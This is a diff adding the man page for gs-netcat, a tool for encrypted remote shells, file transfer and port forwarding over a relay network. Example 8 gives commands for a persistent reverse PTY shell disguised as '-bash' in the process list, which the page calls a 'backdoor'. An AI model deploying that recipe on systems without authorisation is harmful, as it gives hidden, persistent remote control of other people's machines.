@@ -1,0 +1,201 @@
+\# .TH gs-netcat 1 "08 October 2020" "1.0" "gs-netcat man page"
+.Dd October 08, 2020
+.Dt GS-NETCAT 1
+.Os
+.Sh NAME
+.Nm gs-netcat
+.Nd transfer data, forward traffic and execute commands on a remote host. Securely.
+.Sh SYNOPSIS
+.Nm gs-netcat
+.Bk -words
+.Op Fl rlgqwCTSDi
+.Op Fl s Ar secret
+.Op Fl k Ar keyfile
+.Op Fl L Ar logfile
+.Op Fl d Ar IP
+.Op Fl p Ar port
+.Op Fl e Ar cmd
+.Ek
+.Sh DESCRIPTION
+The
+.Nm
+utility is a re-implementation of netcat. It allows two or more users to establish a secure TCP connection with each other in a scenario where all users are behind NAT/Firewall and would not be able to connect to each other directly. Typically a connection between one workstation and another workstation on a different Local Area Network.
+.Pp
+It uses the Global Socket Relay Network (GSRN) instead of direct TCP connections. Neither workstation needs to open a port in their firewall or accept incoming TCP connections.
+.Pp
+The connection is end-2-end encrypted using SRP (RFC 5054) with AES-256 and a 4096 Prime. The GSRN sees only the encrypted traffic. 
+.Pp
+Common uses include:
+.Pp
+.Bl -bullet -offset indent -compact
+.It
+simple TCP proxies
+.It
+PTY shell
+.It
+File transfer
+.It
+a SOCKS ProxyCommand for
+.Xr ssh 1
+.It
+and much, much more.
+.El
+.Pp
+.Sh OPTIONS
+.Bl -tag -width Ds
+.It Fl s Ar secret
+A password chosen by the user. Both users need to use the same password to connect.
+.It Fl k Ar file
+A file containing the password.
+.It Fl g
+Generate a secure random password and output it to standard output.
+.It Fl l
+Server mode (listen for GSRN connections). The default mode is client.
+.It Fl q
+Quite mode. Do not output any warnings or errors.
+.It Fl w
+Client to wait for the listening server to become available.
+.It Fl r
+Receive-only. Do not send any data. Terminate when no more data is available for reading.
+.It Fl C
+Disable encryption and use clear-text instead. Use with caution.
+.It Fl T
+Use TOR. The
+.Nm
+tool will connect via TOR to the GSRN. This requires TOR to be installed and running. The IP and PORT of the TOR server can be set using environment variables.
+.It Fl S
+Server. Act as a Socks4/4a/5 server. Needs -l. The server acts as a Socks4/4a/5 proxy. It allows multiple
+.Nm
+clients to (securely) relay traffic via the server.
+.It Fl D
+Server. Daemon & Watchdog mode.
+.Nm
+will run as a background process and restart itself if killed.
+.It Fl e Ar cmd
+Server. Execute command and send output to the connected client.
+.It Fl d Ar ip
+IPv4 address for port forwarding.
+.It Fl p Ar port
+TCP port to listen on or to forward traffic to.
+.It Fl i
+Interactive login shell. The server spawns a true PTY login shell. The client acts as a true PTY client (with Ctrl-C etc working). The client can terminate the session by typing '~.' at any time or by typing 'exit'. The server supports multiple clients at the same time.
+.El
+
+.Pp
+.Ar port
+can be a numerical value between 1-65535.
+.Sh EXAMPLES
+.Nm Example 1
+- Listen for a new connection using the password 'MySecret':
+.Dl $ gs-netcat -s MySecret -l
+.Pp
+Client connect using the password 'MySecret':
+.Dl $ gs-netcat -s MySecret
+.Pp
+.Nm Example 2
+- spawn a PTY login shell when a client connects:
+.Dl $ gs-netcat -s MySecret -l -i
+.Pp
+Client connect to the server's interactive login shell:
+.Dl $ gs-netcat -s MySecret -i
+.Pp
+.Nm Example 3
+- Execute a command when a client connects:
+.Dl $ gs-netcat -s MySecret -l -e 'echo hello world; id; exit'
+.Pp
+Client connect to the server:
+.Dl $ gs-netcat -s MySecret
+.Pp
+.Nm Example 4
+- Pipe data from client to server:
+.Dl $ gs-netcat -s MySecret -l -r >warez.tar.gz
+.Pp
+Client to read 'warez.tar.gz' and pipe it to the server.
+.Dl $ gs-netcat -s MySecret <warez.tar.gz
+.Pp
+.Nm Example 5
+- Server to act as a Socks4/4a/5 server:
+.Dl $ gs-netcat -s MySecret -l -S
+.Pp
+Client to listen on TCP port 1080 and forward any new connection to the server's Socks server:
+.Dl $ gs-netcat -s MySecret -p 1080
+.Pp
+.Nm Example 6
+- TCP Port Forward all connections to 192.168.6.7:22. Server:
+.Dl $ gs-netcat -s MySecret -l -d 192.168.6.7 -p 22
+.Pp
+Client to listen on TCP port 2222 and forward any new connection to the the server. The server then forwards the connection to 192.168.6.7:22.
+.Dl $ gs-netcat -s MySecret -p 2222
+.Dl $ ssh -p 2222 root@127.0.0.1
+.Pp
+The same using 1 command:
+.Dl $ ssh -o ProxyCommand='gs-netcat -s MySecret' root@ignored
+.Pp
+.Nm Example 7
+- Creating an SFTP server using gs-netcat:
+.Dl $ gs-netcat -s MySecret -l -e /usr/lib/sftp-server
+.Pp
+Client to use SFTP over GSRN (encrypted) to connect to the server:
+.Dl $ sftp -D gs-netcat
+.Pp
+.Nm Example 8
+- Encrypted Reverse PTY shell hidden as '-bash' in the process list - also known as 'backdoor':
+.Dl $ export GSOCKET_ARGS='-s MySecret -l -i -D'
+.Dl $ exec -a -bash gs-netcat &
+.Pp
+Client to connect to the backdoor:
+.Dl $ gs-netcat -s MySecret -i
+
+
+.Sh ENVIRONMENT
+The following environment variables can be set to control the behavior of
+.Nm
+.Pp
+.Nm GSOCKET_SOCKS_IP
+.Dl Specify the IP address of the TOR server (or any other SOCKS server). Default is 127.0.0.1.
+.Pp
+.Nm GSOCKET_SOCKS_PORT
+.Dl The port number of the TOR server (or any other SOCKS server). Default is 9050.
+.Pp
+.Nm GSOCKET_ARGS
+.Dl A string containing additional command line parameters. First the normal command line parameters are processed and then the command line parameters from GSOCKET_ARGS.
+
+.Sh SECURITY
+Passing the password as command line parameter is not secure. Consider using the -k option or GSOCKET_ARGS or enter the password when prompted:
+.Pp
+.Dl $ gs-netcat -k <file>
+.Pp
+.Dl $ export GSOCKET_ARGS="-s MySecret"
+.Dl $ gs-netcat
+.Pp
+.Nm 1.
+The security is end-2-end. This means from User-2-User (and not just to the GSRN). The GSRN relays only (encrypted) data to and from the users.
+.Pp
+.Nm 2.
+The session is 256 bit and ephemeral. It is freshly generated for every session and generated randomly (and is not based on the password). It uses OpenSSL's SRP with AES-256 and a 4096 Prime.
+.Pp
+.Nm 3.
+The password can be 'weak' without weakening the security of the session. A brute force attack against a weak password requires a new TCP connection for every guess.
+.Pp
+.Nm 4.
+Do not use stupid passwords like 'password123'. Malice might pick the same (stupid) password by chance and connect. If in doubt use gs-netcat -g to generate a strong one. Alice's and Bob's password should at least be strong enough so that Malice can not guess it by chance while Alice is waiting for Bob to connect.
+.Pp
+.Nm 5.
+If Alice shares the same password with Bob and Charlie and either one of them connects then Alice can not tell if it is Bob or Charlie who connected.
+.Pp
+.Nm 6.
+Assume Alice shares the same password with Bob and Malice. When Alice stops listening for a connection then Malice could start to listen for the connection instead. Bob (when opening a new connection) can not tell if he is connecting to Alice or to Malice. Use -a <token> if you worry about this. TL;DR: When sharing the same password with a group larger than 2 then it is assumed that everyone in that group plays nicely. Otherwise use SSH over the GS/TLS connection.
+.Pp
+.Nm 7.
+SRP has Perfect Forward Secrecy. This means that past sessions can not be decrypted even if the password becomes known.
+
+.Sh NOTES
+The latest version is available from https://github.com/hackerschoice/gsocket/.
+
+.Sh SEE ALSO
+nc(1)
+
+.Sh BUGS
+Efforts have been made to have
+.Nm
+"do the right thing" in all its various modes. If you believe that it is doing the wrong thing under whatever circumstances, please notify me (skyper@thc.org) and tell me how you think it should behave.
